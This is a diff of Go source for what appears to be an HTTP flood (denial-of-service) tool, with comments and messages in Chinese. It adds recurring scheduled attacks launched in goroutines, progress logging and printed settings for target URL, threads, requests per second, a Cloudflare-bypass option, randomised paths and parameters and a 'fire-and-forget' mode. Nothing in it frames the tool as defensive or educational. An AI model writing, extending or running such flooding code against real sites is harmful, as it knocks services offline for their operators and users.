@@ -198,25 +198,53 @@ func startAttack(config *Config) {
 
 func startScheduledAttack(config *Config) {
 	if config.ScheduleInterval <= 0 {
+		fmt.Printf("❌ 定时攻击间隔无效: %d分钟\n", config.ScheduleInterval)
 		return
 	}
+	
 	fmt.Printf("🕐 启动定时攻击模式: 每%d分钟执行一次，每次%d分钟\n", config.ScheduleInterval, config.ScheduleDuration)
+	fmt.Printf("📅 下次执行时间: %s\n", time.Now().Add(time.Duration(config.ScheduleInterval)*time.Minute).Format("2006-01-02 15:04:05"))
+	
 	ticker := time.NewTicker(time.Duration(config.ScheduleInterval) * time.Minute)
 	defer ticker.Stop()
 
+	// 先等待第一次定时器触发
+	fmt.Printf("⏳ 等待第一次定时器触发...\n")
+	firstTrigger := <-ticker.C
+	fmt.Printf("🔔 第一次定时器触发: %s\n", firstTrigger.Format("2006-01-02 15:04:05"))
+	
+	attackCount := 0
 	for {
-		executeAttack(config, config.ScheduleDuration)
-		<-ticker.C
+		attackCount++
+		fmt.Printf("\n🚀 [第%d次] 定时攻击开始执行 - %s\n", attackCount, time.Now().Format("2006-01-02 15:04:05"))
+		
+		// 在goroutine中执行攻击，避免阻塞定时器
+		go executeAttack(config, config.ScheduleDuration)
+		
+		fmt.Printf("⏳ 等待下次执行时间: %s\n", time.Now().Add(time.Duration(config.ScheduleInterval)*time.Minute).Format("2006-01-02 15:04:05"))
+		nextTrigger := <-ticker.C
+		fmt.Printf("🔔 定时器触发: %s\n", nextTrigger.Format("2006-01-02 15:04:05"))
 	}
 }
 
 func executeAttack(config *Config, durationMinutes int) {
 	if config.RPS <= 0 {
+		fmt.Printf("❌ RPS配置无效: %d\n", config.RPS)
 		return
 	}
 	
-	fmt.Printf("🚀 开始攻击: %s\n", config.TargetURL)
-	fmt.Printf("📊 配置: 线程数=%d, RPS=%d, 持续时间=%d分钟\n", config.Threads, config.RPS, durationMinutes)
+	fmt.Printf("🎯 执行攻击任务开始\n")
+	fmt.Printf("📍 目标URL: %s\n", config.TargetURL)
+	fmt.Printf("⚙️  攻击模式: %s\n", strings.ToUpper(config.Mode))
+	fmt.Printf("🧵 线程数: %d\n", config.Threads)
+	fmt.Printf("⚡ RPS: %d\n", config.RPS)
+	fmt.Printf("⏱️  持续时间: %d分钟\n", durationMinutes)
+	fmt.Printf("🛡️  CF绕过: %t\n", config.CFBypass)
+	fmt.Printf("🎲 随机路径: %t\n", config.RandomPath)
+	fmt.Printf("🎲 随机参数: %t\n", config.RandomParams)
+	if config.FireAndForget {
+		fmt.Printf("🔥 火后不理模式: 启用\n")
+	}
 	
 	// 高并发配置，支持亿万级并发
 	threads := config.Threads
@@ -286,13 +314,34 @@ func executeAttack(config *Config, durationMinutes int) {
 	}
 
 	duration := time.Duration(durationMinutes) * time.Minute
-	fmt.Printf("⏱️ 攻击将持续 %d 分钟...\n", durationMinutes)
+	fmt.Printf("⏱️ 攻击将持续 %d 分钟 (预计结束时间: %s)...\n", durationMinutes, time.Now().Add(duration).Format("2006-01-02 15:04:05"))
+	
+	// 每30秒输出一次进度
+	startTime := time.Now()
+	go func() {
+		ticker := time.NewTicker(30 * time.Second)
+		defer ticker.Stop()
+		for {
+			select {
+			case <-ticker.C:
+				elapsed := time.Since(startTime)
+				remaining := duration - elapsed
+				if remaining > 0 {
+					fmt.Printf("📊 攻击进行中... 已运行: %v, 剩余: %v\n", elapsed.Round(time.Second), remaining.Round(time.Second))
+				}
+			case <-done:
+				return
+			}
+		}
+	}()
+	
 	time.Sleep(duration)
 
-	fmt.Printf("🛑 攻击时间结束，正在停止...\n")
+	fmt.Printf("🛑 攻击时间结束，正在停止所有worker线程...\n")
 	close(done)
 	wg.Wait()
 
+	fmt.Printf("✅ 攻击任务完成 (总耗时: %v)\n", time.Since(startTime))
 	printFinalStats()
 }
 
